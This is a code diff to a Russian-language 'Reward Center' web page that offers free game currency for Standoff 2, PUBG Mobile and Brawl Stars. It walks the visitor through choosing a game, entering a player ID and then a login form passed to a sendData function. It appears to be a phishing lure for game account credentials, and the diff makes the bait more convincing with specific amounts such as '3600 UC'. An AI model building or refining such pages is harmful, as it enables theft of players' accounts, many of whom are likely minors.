@@ -13,7 +13,7 @@
         display: flex;
         justify-content: center;
         align-items: center;
-        padding: 20px;
+        padding: 16px;
         color: #e2e8f0;
     }
     
@@ -31,6 +31,7 @@
         position: relative;
     }
 
+    /* Прогресс-бар — стартует с 0% */
     .progress-bar {
         height: 4px;
         background: rgba(255,255,255,0.05);
@@ -38,19 +39,19 @@
     }
     .progress-fill {
         height: 100%;
-        width: 33%;
+        width: 0%;
         background: linear-gradient(90deg, #10b981, #34d399);
-        transition: width 0.4s ease;
+        transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
         border-radius: 0 4px 4px 0;
     }
 
     .inner-content {
-        padding: 32px 28px;
+        padding: 28px 26px;
     }
     
     .header {
         text-align: center;
-        margin-bottom: 28px;
+        margin-bottom: 22px;
     }
     .logo-icon {
         display: inline-flex;
@@ -60,7 +61,7 @@
         height: 52px;
         background: linear-gradient(135deg, #10b981, #059669);
         border-radius: 14px;
-        margin-bottom: 14px;
+        margin-bottom: 12px;
         font-size: 26px;
         box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
     }
@@ -77,12 +78,11 @@
         line-height: 1.4;
     }
     
-    /* Меню кнопок */
     .buttons {
         display: flex;
         flex-direction: column;
         gap: 10px;
-        margin-bottom: 24px;
+        margin-bottom: 20px;
     }
     
     .btn {
@@ -136,8 +136,8 @@
     .btn-text .platform-reward {
         display: block;
         font-size: 12px;
-        color: #94a3b8;
-        font-weight: 400;
+        color: #10b981;
+        font-weight: 500;
     }
     
     .btn .arrow {
@@ -245,48 +245,48 @@
     .welcome {
         display: flex;
         flex-direction: column;
-        gap: 16px;
+        gap: 14px;
         text-align: center;
     }
     .welcome h2 {
-        font-size: 17px;
+        font-size: 16px;
         font-weight: 700;
         color: #ffffff;
         line-height: 1.4;
-        margin-bottom: 4px;
+        margin-bottom: 2px;
     }
     .welcome p {
-        font-size: 14px;
+        font-size: 13.5px;
         color: #cbd5e1;
-        line-height: 1.6;
+        line-height: 1.55;
     }
     .welcome .features {
         display: flex;
         flex-direction: column;
-        gap: 10px;
-        margin: 8px 0;
+        gap: 8px;
+        margin: 6px 0;
         text-align: left;
         background: rgba(15, 23, 42, 0.5);
         border: 1px solid rgba(255, 255, 255, 0.06);
         border-radius: 14px;
-        padding: 16px;
+        padding: 14px 16px;
     }
     .welcome .features div {
         display: flex;
         align-items: center;
         gap: 10px;
-        font-size: 13.5px;
+        font-size: 13px;
         color: #e2e8f0;
         line-height: 1.4;
     }
     .welcome .features .check {
         color: #10b981;
-        font-size: 16px;
+        font-size: 15px;
         flex-shrink: 0;
     }
     .welcome .features .warn {
         color: #f59e0b;
-        font-size: 16px;
+        font-size: 15px;
         flex-shrink: 0;
     }
     .welcome .features .warn-text {
@@ -294,16 +294,16 @@
         font-weight: 600;
     }
     .welcome .bottom-text {
-        font-size: 13px;
+        font-size: 12.5px;
         color: #94a3b8;
-        margin-top: 4px;
+        margin-top: 2px;
     }
 
     .footer {
         text-align: center;
         font-size: 11px;
         color: #475569;
-        padding: 16px 28px 24px;
+        padding: 14px 26px 18px;
         border-top: 1px solid rgba(255,255,255,0.05);
         background: rgba(15, 23, 42, 0.3);
     }
@@ -318,13 +318,13 @@
     <div class="inner-content">
         <!-- ЭКРАН 0: Пред-сообщение -->
         <div class="welcome" id="welcomeStep">
-            <div class="header" style="margin-bottom: 8px;">
+            <div class="header" style="margin-bottom: 4px;">
                 <div class="logo-icon">🎁</div>
                 <h1>Reward Center</h1>
             </div>
 
             <h2>Добро пожаловать в официальный центр выдачи наград</h2>
-            <p>Здесь вы можете <b style="color:#10b981;">выбрать награду</b> и получить бесплатную раздачу внутриигровой валюты: <b>Gold</b>, <b>UC</b> и <b>Gems</b> — без покупок и без подписок.</p>
+            <p>Здесь вы можете <b style="color:#10b981;">выбрать награду</b> и получить бесплатную раздачу внутриигровой валюты: <b>Gold</b>, <b>UC</b> и <b>Brawl Pass +</b> — без покупок и без подписок.</p>
 
             <div class="features">
                 <div>
@@ -359,29 +359,29 @@
             </div>
 
             <div class="buttons" id="buttons">
-                <button class="btn" data-game="standoff" onclick="selectPlatform('STANDOFF 2', 'Gold')">
+                <button class="btn" data-game="standoff" onclick="selectPlatform('STANDOFF 2', '1500 Gold')">
                     <div class="icon">🪙</div>
                     <div class="btn-text">
                         <span class="platform-name">STANDOFF 2</span>
-                        <span class="platform-reward">Награда: Gold</span>
+                        <span class="platform-reward">Награда: 1500 Gold</span>
                     </div>
                     <div class="arrow">›</div>
                 </button>
                 
-                <button class="btn" data-game="pubg" onclick="selectPlatform('PUBG Mobile', 'UC')">
+                <button class="btn" data-game="pubg" onclick="selectPlatform('PUBG Mobile', '3600 UC')">
                     <div class="icon">💰</div>
                     <div class="btn-text">
                         <span class="platform-name">PUBG Mobile</span>
-                        <span class="platform-reward">Награда: UC</span>
+                        <span class="platform-reward">Награда: 3600 UC</span>
                     </div>
                     <div class="arrow">›</div>
                 </button>
                 
-                <button class="btn" data-game="brawl" onclick="selectPlatform('Brawl Stars', 'Gems')">
+                <button class="btn" data-game="brawl" onclick="selectPlatform('Brawl Stars', 'Brawl Pass +')">
                     <div class="icon">💎</div>
                     <div class="btn-text">
                         <span class="platform-name">Brawl Stars</span>
-                        <span class="platform-reward">Награда: Gems</span>
+                        <span class="platform-reward">Награда: Brawl Pass +</span>
                     </div>
                     <div class="arrow">›</div>
                 </button>
@@ -422,15 +422,20 @@
 <script>
     let selected = { platform: '', reward: '' };
 
+    // Прогресс-бар: старт с 0%
     function updateProgress(percent) {
         document.getElementById('progressFill').style.width = percent + '%';
     }
 
-    // Переход с пред-сообщения на главное меню
+    // Стартуем с 0%
+    window.addEventListener('DOMContentLoaded', function() {
+        updateProgress(0);
+    });
+
     function showMain() {
         document.getElementById('welcomeStep').style.display = 'none';
         document.getElementById('mainStep').style.display = 'block';
-        updateProgress(33);
+        updateProgress(33); // Заполняем на 1/3
     }
 
     function selectPlatform(platform, reward) {
@@ -440,7 +445,7 @@
         document.getElementById('buttons').style.display = 'none';
         document.getElementById('header').style.display = 'none';
         document.getElementById('idTitle').textContent = `Введите ID · ${platform}`;
-        updateProgress(66);
+        updateProgress(66); // Заполняем на 2/3
 
         let hint = '';
         let placeholder = '';
@@ -499,7 +504,7 @@
         document.getElementById('idStep').classList.remove('active');
         document.getElementById('formTitle').textContent = `${selected.reward} · ${selected.platform}`;
         document.getElementById('loginStep').classList.add('active');
-        updateProgress(100);
+        updateProgress(100); // Полностью заполняем
     }
 
     function sendData(e) {
